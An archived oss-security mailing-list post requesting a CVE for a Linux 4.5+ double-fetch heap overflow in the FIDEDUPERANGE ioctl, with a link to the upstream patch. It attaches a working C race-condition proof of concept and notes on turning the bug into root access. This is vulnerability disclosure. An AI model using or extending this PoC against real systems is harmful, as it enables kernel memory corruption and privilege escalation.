X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6613" "Sunday" "31" "July" "2016" "15:25:20" "-0600" "Scott Bauer" "sbauer@plzdonthack.me" "<579E6CC0.2020509@plzdonthack.me>" "230" "[oss-security] CVE Request: Linux >= 4.5 double fetch leading to heap overflow" "^Date:" nil nil "7" "2016073121:25:20" "[oss-security] CVE Request: Linux >= 4.5 double fetch leading to heap overflow" (number mark "        sbauer@plzdo Jul 31  230/6613  " thread-indent "\"[oss-security] CVE Request: Linux >= 4.5 double fetch leading to heap overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7582 invoked by uid 550); 31 Jul 2016 21:25:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 7561 invoked from network); 31 Jul 2016 21:25:40 -0000
Message-ID: <579E6CC0.2020509@plzdonthack.me>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
 Thunderbird/38.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
 protocol="application/pgp-signature";
 boundary="d7oL53kaSeU70e31T63EmVHOxOeAVeISG"
X-XM-SPF: eid=1bTyEf-0004UX-Up;;;mid=<579E6CC0.2020509@plzdonthack.me>;;;hst=mx01.mta.xmission.com;;;ip=166.70.198.91;;;frm=sbauer@plzdonthack.me;;;spf=none
X-SA-Exim-Connect-IP: 166.70.198.91
X-SA-Exim-Mail-From: sbauer@plzdonthack.me
X-Spam-DCC: XMission; sa05 1397; Body=1 Fuz1=1 Fuz2=1 
X-Spam-Combo: *;oss-security@lists.openwall.com
X-Spam-Relay-Country: 
X-Spam-Timing: total 408 ms - load_scoreonly_sql: 0.06 (0.0%),
	signal_user_changed: 5.0 (1.2%), b_tie_ro: 3.5 (0.9%), parse: 1.70 (0.4%),
	extract_message_metadata: 12 (2.9%), get_uri_detail_list: 3.7 (0.9%),
	tests_pri_-1000: 2.7 (0.7%), tests_pri_-950: 1.20 (0.3%), tests_pri_-900:
	1.00 (0.2%), tests_pri_-400: 35 (8.5%), check_bayes: 33 (8.1%), b_tokenize: 9
	(2.2%), b_tok_get_all: 11 (2.7%), b_comp_prob: 4.2 (1.0%), b_tok_touch_all: 6
	(1.5%), b_finish: 0.91 (0.2%), tests_pri_0: 341 (83.5%),
	check_dkim_signature: 0.53 (0.1%), check_dkim_adsp: 5 (1.3%), tests_pri_500:
	6 (1.4%), rewrite_mail: 0.00 (0.0%)
X-SA-Exim-Version: 4.2.1 (built Fri, 13 May 2016 17:07:30 -0600)
X-SA-Exim-Scanned: Yes (on mx01.mta.xmission.com)
Date: Sun, 31 Jul 2016 15:25:20 -0600
From: Scott Bauer <sbauer@plzdonthack.me>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Linux >= 4.5 double fetch leading to heap overflow
To: oss-security@lists.openwall.com

--d7oL53kaSeU70e31T63EmVHOxOeAVeISG
Content-Type: multipart/mixed; boundary="u6jxTfX9P0LUEmlbsLrQ3uCGwBeKhcHhu"
From: Scott Bauer <sbauer@plzdonthack.me>
To: oss-security@lists.openwall.com
Message-ID: <579E6CC0.2020509@plzdonthack.me>
Subject: CVE Request: Linux >= 4.5 double fetch leading to heap overflow

--u6jxTfX9P0LUEmlbsLrQ3uCGwBeKhcHhu
Content-Type: multipart/mixed;
 boundary="------------020901040407050104020704"

This is a multi-part message in MIME format.
--------------020901040407050104020704
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Good afternoon,

For Mitre:

Some code was moved from btrfs to the generic vfs ioctl:
(https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/fs/=
ioctl.c?h=3Dv4.5&id=3D54dbc15172375641ef03399e8f911d7165eb90fb).

During the port a double fetch with userland was introduced which can lead =
to an undersized allocation and subsequent heap overflow
with potentially controlled data. It has been patched in upstream here:

https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=
=3D10eec60ce79187686e052092e5383c99b4420a20


For OSS-sec:

attached is a PoC. I attempted to write an exploit for this but that's not =
really my forte. I feel like this bug
has the potential for a workable user->root exploit but I couldn't do it.

1: You can control which cache the overflow happens on. I picked the same c=
ache as the File struct.
2: the code writes 2 different width zeros past the allocation, one 32 bit =
and the other 64 bit.
3: I attempted to overflow and write the 32 bit 0 to the top half of a poin=
ter so it would point to userland,
but I couldn't find a suitable structure to overflow into.

So if anyone plays around with this and gets a workable exploit please shar=
e the details as I'm looking to expand my exploitation knowledge, and techn=
iques.


Thank you,
--Scott

For the poc:
gcc -pthread doublefetch.c
./a.out 7 65534 1000000 0



--------------020901040407050104020704
Content-Type: text/x-csrc;
 name="doublefetch.c"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
 filename="doublefetch.c"

#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <pthread.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>



static const char* file_path =3D "/tmp/test.txt";
static const char* file_path2 =3D "/tmp/test2.txt";

typedef int64_t __s64;
typedef int32_t __s32;
typedef uint64_t __u64;
typedef uint16_t __u16;
typedef uint32_t __u32;

struct file_dedupe_range_info {
	__s64 dest_fd;          /* in - destination file */
	__u64 dest_offset;      /* in - start of extent in destination */
	__u64 bytes_deduped;    /* out - total # of bytes we were able */
	__s32 status;           /* out - see above description */
	__u32 reserved;         /* must be zero */
};

/* from struct btrfs_ioctl_file_extent_same_args */
struct file_dedupe_range {
	__u64 src_offset;       /* in - start of extent in source */
	__u64 src_length;       /* in - length of extent */
	__u16 dest_count;       /* in - total elements in info array */
	__u16 reserved1;        /* must be zero */
	__u32 reserved2;        /* must be zero */
	struct file_dedupe_range_info info[0];
};

#define FIDEDUPERANGE   _IOWR(0x94, 54, struct file_dedupe_range)

volatile static int trigger =3D 0;
volatile static int trigger1 =3D 0;
volatile static int stop =3D 0;
volatile uint16_t wew;
static unsigned int stupid_hack =3D 1;
static void *size_change(void *addr)
{
	struct file_dedupe_range *range =3D addr;

	while(!stop) {
		trigger1 =3D 1;
		while (trigger =3D=3D 0 ) { }
		usleep(stupid_hack);
		range->dest_count =3D wew;
		stupid_hack++;
		if(stupid_hack > 100000)
			stupid_hack =3D 1;
		trigger1 =3D 0;
	}
}



int main(int argc, char **argv)
{
	int fd, fd2, i, counter;
	struct file_dedupe_range *range;
	pthread_t race_car;

	int fds[100];
	int num =3D atoi(argv[1]);
	int loop =3D atoi(argv[3]);
	wew =3D atoi(argv[2]);
	stupid_hack =3D atoi(argv[4]);
	fd =3D open(file_path, O_RDWR | O_CREAT);
	fd2 =3D open(file_path2, O_RDWR | O_CREAT);

	if (fd < 0) {
		printf("Failed to open %s with error %s\n", file_path,
		       strerror(errno));
		return EXIT_FAILURE;
	}

	range =3D malloc(sizeof(*range) + sizeof(struct file_dedupe_range_info)*nu=
m);
	memset(range, 0, sizeof(*range) + sizeof(struct file_dedupe_range_info)*nu=
m);

	if (!range) {
		printf("Failed to alloc mem, exiting\n");
		close(fd);
		return EXIT_FAILURE;
	}

	range->dest_count =3D num;
	range->src_offset =3D 0;
	range->src_length =3D 65535+4096+4096;
	for (i =3D 0; i < num; i++)
		range->info[i].dest_fd =3D fd2;

	//write(fd, file_path, 4);
	sync();

	pthread_create(&race_car, NULL, size_change, range);
	for (counter =3D 0; counter < loop; counter++) {
		for (i =3D 0; i < 100; i++) {
			fds[i] =3D socket(AF_INET, SOCK_STREAM, 0);
			if (fds[i] < 0) {
				printf("Failed to open socket #%d\n", i);
			}
		}
=09=09=09

		while(trigger1 !=3D 1) { }
		trigger =3D 1;
		asm volatile("sfence");
		close(fds[50]);
		close(fds[51]);
		ioctl(fd, FIDEDUPERANGE, range);
		//printf("ioctl done with %s\n", strerror(errno));
		trigger =3D 0;
		while(trigger1 =3D=3D 0) { }
		range->dest_count =3D num;
		for (i =3D 0; i < 100; i++)
			close(fds[i]);
	}
	stop =3D 1;
	pthread_join(race_car, NULL);

}

--------------020901040407050104020704--

--u6jxTfX9P0LUEmlbsLrQ3uCGwBeKhcHhu--

--d7oL53kaSeU70e31T63EmVHOxOeAVeISG
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.22 (GNU/Linux)

iQIcBAEBAgAGBQJXnmzFAAoJEAe5Q3+PjGSj3FUP+gLC/zpy9A7OvuVNIocD+kYK
EqNegjdPvLzl0BbAlaEZ6MtctgOoD+z8TDXximPX/7d9D0UXlARUD8H6iI2wmo36
3VY2HyDAoXiBQyNPkJByyH0fGQi2St/QUCWFBEwk1B2X0ZSsKYoDb8a8KuiXUooM
H4SJZYboI6qkY/Ev7keaIMe0s5asYWqQnU+yl471O9t8d6mWFBs5rL+ljeVGZv7g
udahOa9Y9FgPzPIAbQgzSnJ43N/j5o6dS4oBQfJb6O+tyxvFeI/Dy3sMhRzM26Rp
IVmXOz7SeGC6TtC9tLz0BnEf72QsNox8dI2EXNUjYlksB+TrH3Shb6JBxb5UVnyH
EuXlHkHrI6GXlYhJbhmCKLoKQNd58ww/NciSdxesKSCCwAncsWyp/L6L+RK48WCa
pjjsY6M3t6IAMs6ucW/VXQPJNjD+ceAELDCZsM3G3yoMh56FhN9S/6sK2n0ktbcH
7IjeI6JAX1JA/AnHdd0qxnC0dHi3yr7m+XPK0olY1D8irMsUtyrsT/uUr8ifGiBK
Ys/XCk5HJi3bxQ8XJZDnZJ03CzowNKHxmgpkOMFV83GxLzsJtHNGgKg2JuUlfIX8
bbe+qOsm/6WdP+xhiPjyXaflppH4JhgqZtFejhX12DeshwOlD+fMqfXGEFICzmHY
wLd9cC+yxqYAKosPwIv3
=1Qai
-----END PGP SIGNATURE-----

--d7oL53kaSeU70e31T63EmVHOxOeAVeISG--
